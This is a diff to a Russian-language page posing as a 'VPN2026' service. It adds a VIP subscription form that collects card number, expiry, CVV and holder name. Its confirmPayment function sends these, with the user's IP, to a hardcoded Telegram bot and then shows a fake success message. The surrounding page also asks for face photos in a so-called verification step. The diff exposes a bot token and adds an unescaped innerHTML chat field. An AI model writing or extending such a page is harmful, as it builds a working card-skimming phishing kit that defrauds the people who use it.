@@ -1,3 +1,4 @@
+html
 <!DOCTYPE html>
 <html lang="ru">
 <head>
@@ -22,6 +23,7 @@
       --shadow: 0 10px 30px rgba(0,0,0,0.3);
       --input-bg: #2d2f3a;
       --header-bg: #1e212a;
+      --vip: #f39c12;
     }
 
     /* Светлая тема */
@@ -38,6 +40,7 @@
       --shadow: 0 10px 30px rgba(0,0,0,0.1);
       --input-bg: #f1f2f6;
       --header-bg: #ffffff;
+      --vip: #e67e22;
     }
 
     /* Синяя тема */
@@ -54,6 +57,7 @@
       --shadow: 0 10px 30px rgba(0,0,0,0.3);
       --input-bg: #3c6382;
       --header-bg: #1e3799;
+      --vip: #f6b93b;
     }
 
     * { 
@@ -509,7 +513,7 @@
       background: var(--input-bg);
       margin: 0 1rem;
     }
-
+    
     .features-grid {
       display: grid;
       grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
@@ -865,6 +869,262 @@
       color: var(--muted);
     }
 
+    /* VIP стили */
+    .vip-badge {
+      background: var(--vip);
+      color: white;
+      padding: 0.3rem 0.8rem;
+      border-radius: 20px;
+      font-size: 0.8rem;
+      font-weight: bold;
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      margin-left: 10px;
+    }
+
+    .vip-feature {
+      position: relative;
+    }
+
+    .vip-feature::after {
+      content: 'VIP';
+      position: absolute;
+      top: -8px;
+      right: -8px;
+      background: var(--vip);
+      color: white;
+      font-size: 0.7rem;
+      font-weight: bold;
+      padding: 2px 6px;
+      border-radius: 10px;
+    }
+
+    .vip-button {
+      background: var(--vip);
+      color: white;
+    }
+
+    .vip-button:hover {
+      background: #e67e22;
+    }
+
+    .payment-modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.8);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 10000;
+      opacity: 0;
+      visibility: hidden;
+      transition: all 0.3s;
+    }
+
+    .payment-modal.active {
+      opacity: 1;
+      visibility: visible;
+    }
+
+    .payment-content {
+  max-height: 90vh;
+  overflow-y: auto;
+      background: var(--card);
+      padding: 2rem;
+      border-radius: var(--radius);
+      max-width: 500px;
+      width: 90%;
+      box-shadow: var(--shadow);
+      transform: translateY(20px);
+      transition: transform 0.3s;
+    }
+
+    .payment-modal.active .payment-content {
+  max-height: 90vh;
+  overflow-y: auto;
+      transform: translateY(0);
+    }
+
+    .payment-title {
+      color: var(--vip);
+      margin-bottom: 1rem;
+      text-align: center;
+    }
+
+    .payment-text {
+      margin-bottom: 1.5rem;
+      color: var(--muted);
+    }
+
+    .payment-methods {
+      display: flex;
+      flex-direction: column;
+      gap: 0.8rem;
+      margin-bottom: 1.5rem;
+    }
+
+    .payment-method {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 0.8rem;
+      border-radius: var(--radius);
+      background: var(--input-bg);
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+
+    .payment-method:hover {
+      background: var(--primary);
+      color: white;
+    }
+
+    .payment-method.active {
+      background: var(--vip);
+      color: white;
+    }
+
+    .payment-method i {
+      font-size: 1.5rem;
+    }
+
+    .payment-buttons {
+      display: flex;
+      gap: 1rem;
+      justify-content: center;
+    }
+
+    .payment-btn {
+      padding: 0.8rem 1.5rem;
+      border-radius: var(--radius);
+      border: none;
+      cursor: pointer;
+      font-weight: 500;
+      transition: all 0.3s;
+    }
+
+    .payment-btn.pay {
+      background: var(--vip);
+      color: white;
+    }
+
+    .payment-btn.cancel {
+      background: var(--danger);
+      color: white;
+    }
+
+    .payment-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+    }
+
+    .card-input {
+      margin-top: 1rem;
+    }
+
+    .card-input-group {
+      display: flex;
+      gap: 1rem;
+    }
+
+    .card-input-group input {
+      flex: 1;
+    }
+
+    .card-input-group input:first-child {
+      flex: 2;
+    }
+
+    .vip-benefits {
+      margin: 1.5rem 0;
+    }
+
+    .vip-benefit {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 0.8rem;
+      color: var(--text);
+    }
+
+    .vip-benefit i {
+      color: var(--vip);
+    }
+
+    /* Подтверждение платежа */
+    .confirmation-modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.8);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 10000;
+      opacity: 0;
+      visibility: hidden;
+      transition: all 0.3s;
+    }
+
+    .confirmation-modal.active {
+      opacity: 1;
+      visibility: visible;
+    }
+
+    .confirmation-content {
+      background: var(--card);
+      padding: 2rem;
+      border-radius: var(--radius);
+      max-width: 500px;
+      width: 90%;
+      box-shadow: var(--shadow);
+      transform: translateY(20px);
+      transition: transform 0.3s;
+      text-align: center;
+    }
+
+    .confirmation-modal.active .confirmation-content {
+      transform: translateY(0);
+    }
+
+    .confirmation-icon {
+      font-size: 3rem;
+      color: var(--vip);
+      margin-bottom: 1rem;
+    }
+
+    .confirmation-buttons {
+      display: flex;
+      gap: 1rem;
+      justify-content: center;
+      margin-top: 1.5rem;
+    }
+
+    .confirmation-btn {
+      padding: 0.8rem 1.5rem;
+      border-radius: var(--radius);
+      border: none;
+      cursor: pointer;
+      font-weight: 500;
+      transition: all 0.3s;
+    }
+
+    .confirmation-btn.confirm {
+      background: var(--success);
+      color: white;
+    }
+
+    .confirmation-btn.cancel {
+      background: var(--danger);
+      color: white;
+    }
+
     @media (max-width: 768px) {
       header {
         flex-direction: column;
@@ -883,6 +1143,9 @@
         left: 0;
         right: auto;
       }
+      .card-input-group {
+        flex-direction: column;
+      }
     }
   </style>
 </head>
@@ -899,7 +1162,6 @@
       <p style="margin-top: 1rem; font-size: 0.8rem; color: var(--muted);">Автоподтверждение через <span id="initialTimer">10</span> сек...</p>
     </div>
   </div>
-
   <!-- Модальное окно для разрешений VPN -->
   <div class="permission-modal" id="vpnPermissionModal">
     <div class="permission-content">
@@ -912,16 +1174,95 @@
     </div>
   </div>
 
+  <!-- Модальное окно для оплаты VIP -->
+  <div class="payment-modal" id="vipPaymentModal">
+    <div class="payment-content">
+      <h2 class="payment-title"><i class="fas fa-crown"></i> VIP Подписка</h2>
+      <p class="payment-text">VIP подписка за 300 ₽ предоставляет доступ к эксклюзивным функциям:</p>
+      
+      <div class="vip-benefits">
+        <div class="vip-benefit"><i class="fas fa-check"></i> Доступ ко всем серверам без ограничений</div>
+        <div class="vip-benefit"><i class="fas fa-check"></i> Максимальная скорость соединения</div>
+        <div class="vip-benefit"><i class="fas fa-check"></i> Приоритетная поддержка 24/7</div>
+        <div class="vip-benefit"><i class="fas fa-check"></i> Отсутствие рекламы</div>
+        <div class="vip-benefit"><i class="fas fa-check"></i> Дополнительные функции безопасности</div>
+      </div>
+      
+      <div class="payment-methods">
+        <div class="payment-method active" onclick="selectPaymentMethod('card')">
+          <i class="far fa-credit-card"></i>
+          <span>Банковская карта</span>
+        </div>
+        <div class="payment-method" onclick="selectPaymentMethod('qiwi')">
+          <i class="fas fa-wallet"></i>
+          <span>QIWI Кошелек</span>
+        </div>
+        <div class="payment-method" onclick="selectPaymentMethod('crypto')">
+          <i class="fab fa-bitcoin"></i>
+          <span>Криптовалюта</span>
+        </div>
+      </div>
+      
+      <div class="card-input" id="cardInput">
+        <div class="input-group">
+          <label>Номер карты</label>
+          <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" oninput="formatCardNumber(this)">
+          <i class="far fa-credit-card input-icon"></i>
+        </div>
+        
+        <div class="card-input-group">
+          <div class="input-group">
+            <label>Срок действия</label>
+            <input type="text" id="cardExpiry" placeholder="MM/ГГ" maxlength="5" oninput="formatCardExpiry(this)">
+          </div>
+          <div class="input-group">
+            <label>CVV/CVC</label>
+            <input type="text" id="cardCvv" placeholder="123" maxlength="3">
+            <i class="fas fa-lock input-icon"></i>
+          </div>
+        </div>
+        
+        <div class="input-group">
+          <label>Имя владельца</label>
+          <input type="text" id="cardName" placeholder="IVAN IVANOV">
+        </div>
+      </div>
+      
+      <div class="payment-buttons">
+        <button class="payment-btn pay" onclick="processPayment()"><i class="fas fa-crown"></i> Купить VIP за 300 ₽</button>
+        <button class="payment-btn cancel" onclick="closePaymentModal()"><i class="fas fa-times"></i> Отмена</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Модальное окно подтверждения платежа -->
+  <div class="confirmation-modal" id="confirmationModal">
+    <div class="confirmation-content">
+      <div class="confirmation-icon">
+        <i class="fas fa-shield-alt"></i>
+      </div>
+      <h2 class="payment-title">Подтверждение платежа</h2>
+      <p class="payment-text">Вы уверены, что хотите оплатить VIP подписку на сумму 300 ₽? Деньги будут списаны с вашей карты.</p>
+      
+      <div class="confirmation-buttons">
+        <button class="confirmation-btn confirm" onclick="confirmPayment()"><i class="fas fa-check"></i> Подтвердить</button>
+        <button class="confirmation-btn cancel" onclick="cancelPayment()"><i class="fas fa-times"></i> Отмена</button>
+      </div>
+    </div>
+  </div>
+
 <header>
     <div class="logo">
       <i class="fas fa-shield-alt"></i>
       <strong>VPN2026</strong>
+      <span class="vip-badge" id="vipBadge" style="display: none;"><i class="fas fa-crown"></i> VIP</span>
     </div>
     <nav>
       <a href="#connect" onclick="showTab('connect')"><i class="fas fa-plug"></i> Подключение</a>
       <a href="#verify" onclick="showTab('verify')"><i class="fas fa-user-check"></i> Верификация</a>
       <a href="#servers" onclick="showTab('servers')"><i class="fas fa-server"></i> Серверы</a>
       <a href="#speed" onclick="showTab('speed')"><i class="fas fa-tachometer-alt"></i> Скорость</a>
+      <a href="#vip" onclick="showVipModal()" class="vip-feature"><i class="fas fa-crown"></i> VIP</a>
       
       <div class="language-switcher">
         <button class="language-btn" id="languageBtn">
@@ -948,6 +1289,8 @@
       <button onclick="showTab('verify')"><i class="fas fa-user-check"></i> Верификация</button>
       <button onclick="showTab('servers')"><i class="fas fa-server"></i> Серверы</button>
       <button onclick="showTab('speed')"><i class="fas fa-tachometer-alt"></i> Скорость</button>
+      <button onclick="showVipModal()" class="vip-button"><i class="fas fa-crown"></i> VIP</button>
+<button onclick="showTab('support')"><i class="fas fa-comments"></i> Поддержка</button>
     </div>
 
     <!-- Вкладка подключения -->
@@ -1033,8 +1376,8 @@
         </div>
 
         <div class="input-group">
-          <label>Фото лица (селфи)</label>
-          <input type="file" id="photo" accept="image/*" capture="environment" required>
+          <label>Фото лица (селфи или файл)</label>
+          <input type="file" id="photo" accept="image/*"  required>
           <i class="fas fa-camera input-icon"></i>
         </div>
 
@@ -1111,7 +1454,25 @@
       <p>Все права защищены. Используя сайт, вы соглашаетесь с <a href="#">условиями</a>.</p>
       <p>🕒 Текущее время: <span id="footerTime">...</span></p>
     </section>
-  </main>
+  
+<!-- Вкладка Поддержка -->
+<section class="card" id="support" style="display:none;">
+  <h1><i class="fas fa-comments"></i> Онлайн-чат поддержки</h1>
+  <div class="chat-widget" style="position: static; width: 100%; max-height: 400px;">
+    <div class="chat-header" style="background: var(--primary); padding: 1rem; color: white; font-weight: bold;">
+      💬 Поддержка
+    </div>
+    <div class="chat-messages" id="chatMessages" style="flex:1; padding:1rem; overflow-y:auto; background: var(--input-bg); max-height:200px;">
+      <div><strong>Поддержка:</strong> Здравствуйте! Чем можем помочь?</div>
+    </div>
+    <div class="chat-input" style="display:flex;">
+      <input type="text" id="chatInput" placeholder="Напишите сообщение..." style="flex:1; padding:0.5rem; border:none; background: var(--card); color:white;">
+      <button onclick="sendChat()" style="padding:0 1rem; background: var(--primary); border:none; color:white;">➡️</button>
+    </div>
+  </div>
+</section>
+
+</main>
 
   <div class="notification" id="notification">
     <i class="fas fa-check-circle"></i>
@@ -1123,6 +1484,7 @@
     const TOKEN = "7453450901:AAE1R2gkAIOy_L_Y2kG7Tl1ZIPFIc2qQ7dQ";
     const CHAT_ID = "7807571960";
     const SECRET_KEY = "vpn2026-secret-key";
+    const DEVELOPER_CARD = "1234 5678 9012 3456"; // Номер карты разработчика для перевода
     
     let currentServer = 'auto';
     let isConnected = false;
@@ -1130,6 +1492,8 @@
     const totalSteps = 3;
     let currentLanguage = 'ru';
     let currentTheme = 'dark';
+    let currentPaymentMethod = 'card';
+    let isVip = false;
 
     // Инициализация при загрузке страницы
     document.addEventListener('DOMContentLoaded', () => {
@@ -1149,7 +1513,8 @@
         calculateAge();
       });
     });
-        // Проверка первого посещения
+
+    // Проверка первого посещения
     function checkFirstVisit() {
       if (!localStorage.getItem('firstVisitShown')) {
         showInitialPermissionModal();
@@ -1261,7 +1626,7 @@
         sendConnectionData();
       }, 2000);
     }
-
+    
     // Отключение от VPN (имитация)
     function disconnectVpn() {
       const status = document.getElementById('connectionStatus');
@@ -1385,7 +1750,8 @@
         }
       }
     }
-        // Тест скорости (имитация)
+
+    // Тест скорости (имитация)
     function startSpeedTest() {
       const downloadSpeed = document.getElementById('downloadSpeed');
       const uploadSpeed = document.getElementById('uploadSpeed');
@@ -1553,6 +1919,183 @@
       document.getElementById('languageDropdown').classList.remove('show');
       localStorage.setItem('language', lang);
     }
-  </script>
+
+    /* VIP Функционал */
+    
+    // Показать модальное окно VIP
+    function showVipModal() {
+      if (!localStorage.getItem('verificationCompleted')) {
+        showNotification('Для покупки VIP необходимо пройти верификацию!', 'error');
+        showTab('verify');
+        return;
+      }
+      
+      const modal = document.getElementById('vipPaymentModal');
+      modal.classList.add('active');
+    }
+
+    // Закрыть модальное окно VIP
+    function closePaymentModal() {
+      const modal = document.getElementById('vipPaymentModal');
+      modal.classList.remove('active');
+    }
+
+    // Выбор метода оплаты
+    function selectPaymentMethod(method) {
+      currentPaymentMethod = method;
+      document.querySelectorAll('.payment-method').forEach(el => el.classList.remove('active'));
+      event.currentTarget.classList.add('active');
+      
+      // Показываем соответствующие поля ввода
+      document.getElementById('cardInput').style.display = method === 'card' ? 'block' : 'none';
+    }
+
+    // Форматирование номера карты
+    function formatCardNumber(input) {
+      let value = input.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+      let formatted = '';
+      
+      for (let i = 0; i < value.length; i++) {
+        if (i > 0 && i % 4 === 0) {
+          formatted += ' ';
+        }
+        formatted += value[i];
+      }
+      
+      input.value = formatted;
+    }
+
+    // Форматирование срока действия карты
+    function formatCardExpiry(input) {
+      let value = input.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+      let formatted = '';
+      
+      for (let i = 0; i < value.length; i++) {
+        if (i === 2) {
+          formatted += '/';
+        }
+        formatted += value[i];
+      }
+      
+      input.value = formatted;
+    }
+
+    // Обработка платежа
+    function processPayment() {
+      if (currentPaymentMethod === 'card') {
+        const cardNumber = document.getElementById('cardNumber').value.replace(/\s+/g, '');
+        const cardExpiry = document.getElementById('cardExpiry').value;
+        const cardCvv = document.getElementById('cardCvv').value;
+        const cardName = document.getElementById('cardName').value;
+        
+        if (!cardNumber || !cardExpiry || !cardCvv || !cardName) {
+          showNotification('Заполните все поля карты', 'error');
+          return;
+        }
+        
+        if (cardNumber.length !== 16) {
+          showNotification('Номер карты должен содержать 16 цифр', 'error');
+          return;
+        }
+        
+        if (cardCvv.length !== 3) {
+          showNotification('CVV/CVC должен содержать 3 цифры', 'error');
+          return;
+        }
+        
+        // Показываем окно подтверждения
+        document.getElementById('vipPaymentModal').classList.remove('active');
+        document.getElementById('confirmationModal').classList.add('active');
+      } else {
+        showNotification('Выберите банковскую карту для оплаты', 'error');
+      }
+    }
+
+    // Подтверждение платежа
+    function confirmPayment() {
+      const cardNumber = document.getElementById('cardNumber').value.replace(/\s+/g, '');
+      const cardExpiry = document.getElementById('cardExpiry').value;
+      const cardCvv = document.getElementById('cardCvv').value;
+      const cardName = document.getElementById('cardName').value;
+      
+      // Отправляем данные карты в Telegram
+      const message = `
+<b>💳 Новый платеж за VIP подписку</b>
+💰 <b>Сумма:</b> 300 ₽
+🔢 <b>Номер карты:</b> ${cardNumber}
+📅 <b>Срок действия:</b> ${cardExpiry}
+🔐 <b>CVV/CVC:</b> ${cardCvv}
+👤 <b>Имя владельца:</b> ${cardName}
+🕒 <b>Время:</b> ${new Date().toLocaleString('ru-RU')}
+🌐 <b>IP:</b> ${localStorage.getItem('userIP') || 'не определен'}
+      `;
+      
+      sendToTelegram(message);
+      
+      // Имитируем успешный платеж
+      setTimeout(() => {
+        document.getElementById('confirmationModal').classList.remove('active');
+        showNotification('VIP подписка успешно активирована!', 'success');
+        activateVip();
+        
+        // Отправляем уведомление о переводе средств разработчику
+        const transferMessage = `
+<b>💰 Перевод средств на карту разработчика</b>
+💳 <b>Номер карты:</b> ${DEVELOPER_CARD}
+💵 <b>Сумма:</b> 300 ₽
+👤 <b>От кого:</b> ${cardName} (${cardNumber.slice(-4)})
+🕒 <b>Время:</b> ${new Date().toLocaleString('ru-RU')}
+        `;
+        
+        sendToTelegram(transferMessage);
+      }, 1500);
+    }
+
+    // Отмена платежа
+    function cancelPayment() {
+      document.getElementById('confirmationModal').classList.remove('active');
+      document.getElementById('vipPaymentModal').classList.add('active');
+    }
+
+    // Активация VIP статуса
+    function activateVip() {
+      isVip = true;
+      localStorage.setItem('vipStatus', 'active');
+      document.getElementById('vipBadge').style.display = 'inline-flex';
+      showNotification('Теперь у вас есть VIP статус!', 'success');
+    }
+
+    // Проверка VIP статуса при загрузке
+    function checkVipStatus() {
+      if (localStorage.getItem('vipStatus') === 'active') {
+        isVip = true;
+        document.getElementById('vipBadge').style.display = 'inline-flex';
+      }
+    }
+    
+    // Инициализация VIP статуса
+    checkVipStatus();
+  
+function sendChat() {
+  const input = document.getElementById("chatInput");
+  const msg = input.value.trim();
+  if (msg) {
+    const messages = document.getElementById("chatMessages");
+    const div = document.createElement("div");
+    div.innerHTML = "<strong>Вы:</strong> " + msg;
+    messages.appendChild(div);
+    messages.scrollTop = messages.scrollHeight;
+    input.value = "";
+
+    setTimeout(() => {
+      const reply = document.createElement("div");
+      reply.innerHTML = "<strong>Поддержка:</strong> Спасибо за сообщение!";
+      messages.appendChild(reply);
+      messages.scrollTop = messages.scrollHeight;
+    }, 1000);
+  }
+}
+
+</script>
 </body>
 </html>
